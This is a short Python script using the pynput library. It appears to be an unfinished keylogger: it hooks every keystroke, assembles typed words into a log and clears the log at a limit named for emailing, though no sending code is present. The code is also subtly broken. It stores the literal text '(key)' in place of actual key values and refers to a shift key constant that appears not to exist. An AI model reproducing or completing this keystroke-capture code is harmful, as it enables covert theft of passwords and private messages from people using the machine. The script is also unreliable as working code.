

from pynput.keyboard import Key, Listener


# logger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            
            full_log = ''
    elif key == Key.shift_1 or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'(key)'
        char = char[1:-1]
        word += char

    if key == key.esc:
        return False



with Listener( on_press=on_press ) as listener:
    listener.join()

